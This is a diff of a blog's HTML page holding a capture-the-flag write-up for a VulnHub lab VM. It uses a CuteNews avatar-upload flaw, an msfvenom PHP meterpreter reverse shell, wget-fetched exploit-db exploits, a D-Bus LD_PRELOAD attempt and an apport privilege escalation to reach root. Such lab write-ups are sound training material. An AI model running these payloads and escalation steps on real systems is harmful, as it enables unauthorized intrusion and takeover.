@@ -95,7 +95,8 @@
     </header>
 
     <div class="entry-content">
-            <p><img alt="Simple homepage" class="align-left" src="/media/2016.05/simple1.png" width="162"/></p>
+            <p><img class="align-left"
+src="/media/2016.05/simple1.png" alt="Simple homepage" width="162"></p>
 <p>As droopy was not really hard and doesn't contain as much web vulnerability as I
 would hope for, I tried an other VM
 <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">SecTalks: BNE0x03 - Simple</a>
@@ -103,7 +104,8 @@ There were also hints on the description of the machine but with my resolution
 they do not appear when just browsing the main page of vulnhub so I have not
 spoiled myself with the hints this time.</p>
 
-<h2 id="discovery">Discovery</h2>
+
+<h2>Discovery</h2>
 <p>Let's nmap the box to get some knowledge about it:</p>
 <div class="highlight"><pre><span></span><span class="nv">root</span>@<span class="nv">kalili</span>:<span class="o">~</span># <span class="nv">nmap</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span> <span class="o">-</span><span class="nv">p0</span><span class="o">-</span><span class="mi">65535</span>
 
@@ -117,18 +119,22 @@ spoiled myself with the hints this time.</p>
 
 <span class="nv">Nmap</span> <span class="nv">done</span>: <span class="mi">1</span> <span class="nv">IP</span> <span class="nv">address</span> <span class="ss">(</span><span class="mi">1</span> <span class="nv">host</span> <span class="nv">up</span><span class="ss">)</span> <span class="nv">scanned</span> <span class="nv">in</span> <span class="mi">2</span>.<span class="mi">60</span> <span class="nv">seconds</span>
 </pre></div>
+
+
 <p>There seems once more that only the port 80 with a HTTP service is available.</p>
-<h2 id="web">Web</h2>
+<h2>Web</h2>
 <p>We go to the website. We notice that it is powered by CuteNews 2.0.3 (look at
 the footer). We search on internet for vulnerability and found
 <a href="https://www.exploit-db.com/exploits/37474/">one</a>.
 This vulnerability allow the execute PHP code by uploading a malicious avatar.</p>
-<p><img alt="Simple homepage" src="/media/2016.05/simple1.png"/></p>
+<p><img alt="Simple homepage" src="/media/2016.05/simple1.png"></p>
 <p>We create an account in order to upload our avatar.</p>
-<p><img alt="Simple account page" src="/media/2016.05/simple2.png"/></p>
+<p><img alt="Simple account page" src="/media/2016.05/simple2.png"></p>
 <p>We generate a PHP meterpreter using <code>msfvenom</code>:</p>
 <div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">15</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="n">php</span><span class="o">/</span><span class="n">base64</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span>
 </pre></div>
+
+
 <p>We prepare our metasploit for the callback:</p>
 <div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="k">handler</span>
 <span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="k">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="k">set</span> <span class="n">payload</span> <span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
@@ -141,6 +147,8 @@ This vulnerability allow the execute PHP code by uploading a malicious avatar.</
 <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="k">handler</span> <span class="k">on</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">5</span><span class="p">:</span><span class="mi">4444</span>
 <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">the</span> <span class="n">payload</span> <span class="k">handler</span><span class="p">...</span>
 </pre></div>
+
+
 <p>We upload our msfvenom's payload as our avatar.</p>
 <p>We go to <code>http://10.0.2.5/uploads/avatar_john_shell.php</code> and we got our
 meterpreter!
@@ -148,9 +156,11 @@ Let's see what this box is made of:</p>
 <div class="highlight"><pre><span></span><span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
 <span class="n">Linux</span> <span class="k">simple</span> <span class="mi">3</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">30</span><span class="o">-</span><span class="n">generic</span> <span class="o">#</span><span class="mi">40</span><span class="o">~</span><span class="mi">14</span><span class="p">.</span><span class="mi">04</span><span class="p">.</span><span class="mi">1</span><span class="o">-</span><span class="n">Ubuntu</span> <span class="n">SMP</span> <span class="n">Thu</span> <span class="n">Jan</span> <span class="mi">15</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">15</span> <span class="n">UTC</span> <span class="mi">2015</span> <span class="n">i686</span> <span class="n">i686</span> <span class="n">i686</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span>
 </pre></div>
+
+
 <p>Once more an Ubuntu 14.04, like the droopy from yesterday.</p>
-<h2 id="privileges escalation">Privileges escalation</h2>
-<h3 id="cve-2015-1328 exploiting overlayfs">CVE-2015-1328 exploiting overlayFS</h3>
+<h2>Privileges escalation</h2>
+<h3>CVE-2015-1328 exploiting overlayFS</h3>
 <p>Let us try once again to exploit the CVE-2015-1328 exploiting overlayFS to get
 a root shell on the machine. I started a shell from the meterpreter, download
 the exploit, compile it, run it and failed it:</p>
@@ -165,11 +175,11 @@ the exploit, compile it, run it and failed it:</p>
 <span class="n">Connecting</span> <span class="k">to</span> <span class="n">www</span><span class="p">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="p">.</span><span class="n">com</span> <span class="p">(</span><span class="n">www</span><span class="p">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="p">.</span><span class="n">com</span><span class="p">)</span><span class="o">|</span><span class="mi">192</span><span class="p">.</span><span class="mi">124</span><span class="p">.</span><span class="mi">249</span><span class="p">.</span><span class="mi">8</span><span class="o">|</span><span class="p">:</span><span class="mi">443</span><span class="p">...</span> <span class="n">connected</span><span class="p">.</span>
 <span class="n">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="p">...</span> <span class="mi">200</span> <span class="n">OK</span>
 <span class="k">Length</span><span class="p">:</span> <span class="mi">5123</span> <span class="p">(</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="n">K</span><span class="p">)</span> <span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">txt</span><span class="p">]</span>
-<span class="n">Saving</span> <span class="k">to</span><span class="p">:</span> <span class="s1">'37292'</span>
+<span class="n">Saving</span> <span class="k">to</span><span class="p">:</span> <span class="s1">&#39;37292&#39;</span>
 
     <span class="mi">0</span><span class="n">K</span> <span class="p">.....</span>                                                 <span class="mi">100</span><span class="o">%</span>  <span class="mi">409</span><span class="n">M</span><span class="o">=</span><span class="mi">0</span><span class="n">s</span>
 
-<span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">09</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">53</span> <span class="p">(</span><span class="mi">409</span> <span class="n">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="s1">'37292'</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">5123</span><span class="o">/</span><span class="mi">5123</span><span class="p">]</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">09</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">53</span> <span class="p">(</span><span class="mi">409</span> <span class="n">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="s1">&#39;37292&#39;</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">5123</span><span class="o">/</span><span class="mi">5123</span><span class="p">]</span>
 
 <span class="n">mv</span> <span class="mi">37292</span> <span class="n">ofs</span><span class="p">.</span><span class="k">c</span>
 <span class="n">gcc</span> <span class="n">ofs</span><span class="p">.</span><span class="k">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">ofs</span>
@@ -185,8 +195,10 @@ the exploit, compile it, run it and failed it:</p>
 <span class="n">child</span> <span class="n">threads</span> <span class="n">done</span>
 <span class="n">exploit</span> <span class="n">failed</span>
 </pre></div>
+
+
 <p>When searching for exploit regarding linux 3.16.0 I found the CVE-2014-5207:</p>
-<h3 id="cve-2014-5207 fuse-based exploit">CVE-2014-5207 Fuse-based exploit</h3>
+<h3>CVE-2014-5207 Fuse-based exploit</h3>
 <p><a href="https://www.exploit-db.com/exploits/34923/">CVE-2014-5207 Fuse-based exploit</a>.
 I download the exploit, compiled it and once more failed it:</p>
 <div class="highlight"><pre><span></span>gcc -Wall fuse_suid.c `pkg-config fuse --cflags --libs` -o fuse_suid
@@ -196,18 +208,22 @@ fuse_suid.c:21:18: fatal error: fuse.h: No such file or directory
                   ^
 compilation terminated
 </pre></div>
+
+
 <p>When searching for <code>ubuntu 14.04 privilege escalation exploit</code> I found two
 interesting exploits :
  * CVE-2015-3643
  * CVE-2015-1318 + CVE-2015-1862</p>
-<h3 id="cve-2015-3643">CVE-2015-3643</h3>
+<h3>CVE-2015-3643</h3>
 <p><a href="https://www.exploit-db.com/exploits/36820/">The CVE-2015-3643</a> exploit the
 D-Bus listening on com.ubuntu.USBCreator.
 I try this exploit but the module was not available and failed:</p>
-<div class="highlight"><pre><span></span><span class="nv">dbus</span><span class="o">-</span><span class="k">send</span> <span class="o">--</span><span class="nv">print</span><span class="o">-</span><span class="nv">reply</span> <span class="o">--</span><span class="nv">system</span> <span class="o">--</span><span class="nv">dest</span><span class="o">=</span><span class="nv">com</span>.<span class="nv">ubuntu</span>.<span class="nv">USBCreator</span> <span class="o">/</span><span class="nv">com</span><span class="o">/</span><span class="nv">ubuntu</span><span class="o">/</span><span class="nv">USBCreator</span> <span class="nv">com</span>.<span class="nv">ubuntu</span>.<span class="nv">USBCreator</span>.<span class="nv">KVMTest</span> <span class="nv">string</span>:<span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">sda</span> <span class="nv">dict</span>:<span class="nv">string</span>:<span class="nv">string</span>:<span class="nv">DISPLAY</span>,<span class="s2">"</span><span class="s">foo</span><span class="s2">"</span>,<span class="nv">XAUTHORITY</span>,<span class="s2">"</span><span class="s">foo</span><span class="s2">"</span>,<span class="nv">LD_PRELOAD</span>,<span class="s2">"</span><span class="s">/tmp/test.so</span><span class="s2">"</span>
+<div class="highlight"><pre><span></span><span class="nv">dbus</span><span class="o">-</span><span class="k">send</span> <span class="o">--</span><span class="nv">print</span><span class="o">-</span><span class="nv">reply</span> <span class="o">--</span><span class="nv">system</span> <span class="o">--</span><span class="nv">dest</span><span class="o">=</span><span class="nv">com</span>.<span class="nv">ubuntu</span>.<span class="nv">USBCreator</span> <span class="o">/</span><span class="nv">com</span><span class="o">/</span><span class="nv">ubuntu</span><span class="o">/</span><span class="nv">USBCreator</span> <span class="nv">com</span>.<span class="nv">ubuntu</span>.<span class="nv">USBCreator</span>.<span class="nv">KVMTest</span> <span class="nv">string</span>:<span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">sda</span> <span class="nv">dict</span>:<span class="nv">string</span>:<span class="nv">string</span>:<span class="nv">DISPLAY</span>,<span class="s2">&quot;</span><span class="s">foo</span><span class="s2">&quot;</span>,<span class="nv">XAUTHORITY</span>,<span class="s2">&quot;</span><span class="s">foo</span><span class="s2">&quot;</span>,<span class="nv">LD_PRELOAD</span>,<span class="s2">&quot;</span><span class="s">/tmp/test.so</span><span class="s2">&quot;</span>
 <span class="nv">Error</span> <span class="nv">org</span>.<span class="nv">freedesktop</span>.<span class="nv">DBus</span>.<span class="nv">Error</span>.<span class="nv">ServiceUnknown</span>: <span class="nv">The</span> <span class="nv">name</span> <span class="nv">com</span>.<span class="nv">ubuntu</span>.<span class="nv">USBCreator</span> <span class="nv">was</span> <span class="nv">not</span> <span class="nv">provided</span> <span class="nv">by</span> <span class="nv">any</span> .<span class="nv">service</span> <span class="nv">files</span>
 </pre></div>
-<h3 id="cve-2015-1318 + cve-2015-1862">CVE-2015-1318 + CVE-2015-1862</h3>
+
+
+<h3>CVE-2015-1318 + CVE-2015-1862</h3>
 <p><a href="https://www.exploit-db.com/exploits/36746/">The CVE-2015-1318 + CVE-2015-1862</a>
 exploit a feature in ubuntu 14.04 allowing a user to forward crash reports
 (<a href="http://exploiterz.blogspot.fr/2015/04/2015-cve-1318-leading-to-privilege.html">more informations here</a>).
@@ -223,11 +239,11 @@ shell on the box:</p>
 <span class="n">Connecting</span> <span class="k">to</span> <span class="n">www</span><span class="p">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="p">.</span><span class="n">com</span> <span class="p">(</span><span class="n">www</span><span class="p">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="p">.</span><span class="n">com</span><span class="p">)</span><span class="o">|</span><span class="mi">192</span><span class="p">.</span><span class="mi">124</span><span class="p">.</span><span class="mi">249</span><span class="p">.</span><span class="mi">8</span><span class="o">|</span><span class="p">:</span><span class="mi">443</span><span class="p">...</span> <span class="n">connected</span><span class="p">.</span>
 <span class="n">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="p">...</span> <span class="mi">200</span> <span class="n">OK</span>
 <span class="k">Length</span><span class="p">:</span> <span class="mi">5216</span> <span class="p">(</span><span class="mi">5</span><span class="p">.</span><span class="mi">1</span><span class="n">K</span><span class="p">)</span> <span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">txt</span><span class="p">]</span>
-<span class="n">Saving</span> <span class="k">to</span><span class="p">:</span> <span class="s1">'36746'</span>
+<span class="n">Saving</span> <span class="k">to</span><span class="p">:</span> <span class="s1">&#39;36746&#39;</span>
 
     <span class="mi">0</span><span class="n">K</span> <span class="p">.....</span>                                                 <span class="mi">100</span><span class="o">%</span>  <span class="mi">337</span><span class="n">M</span><span class="o">=</span><span class="mi">0</span><span class="n">s</span>
 
-<span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">43</span> <span class="p">(</span><span class="mi">337</span> <span class="n">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="s1">'36746'</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">5216</span><span class="o">/</span><span class="mi">5216</span><span class="p">]</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">11</span> <span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">43</span> <span class="p">(</span><span class="mi">337</span> <span class="n">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="s1">&#39;36746&#39;</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">5216</span><span class="o">/</span><span class="mi">5216</span><span class="p">]</span>
 
 <span class="n">mv</span> <span class="mi">36746</span> <span class="n">newpid</span><span class="p">.</span><span class="k">c</span>
 <span class="n">gcc</span> <span class="o">-</span><span class="k">static</span> <span class="n">newpid</span><span class="p">.</span><span class="k">c</span>
@@ -239,12 +255,16 @@ shell on the box:</p>
 <span class="n">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">)</span>
 </pre></div>
-<h2 id="conclusion_1">Conclusion</h2>
+
+
+<h2>Conclusion</h2>
 <p>We just need to get our hands on the flag to finish it.</p>
 <div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
 <span class="n">U</span> <span class="n">wyn</span> <span class="n">teh</span> <span class="n">Interwebs</span><span class="o">!!</span><span class="mi">1</span><span class="n">eleven11</span><span class="o">!!</span><span class="mi">1</span><span class="o">!</span>
 <span class="n">Hack</span> <span class="n">the</span> <span class="n">planet</span>
 </pre></div>
+
+
 <p>It was a nice box with still not so much web exploitation and only one exploit
 to launch to get to root.
 Thanks to <a href="https://twitter.com/@RobertWinkel">Robert Winkel</a> for the box and as
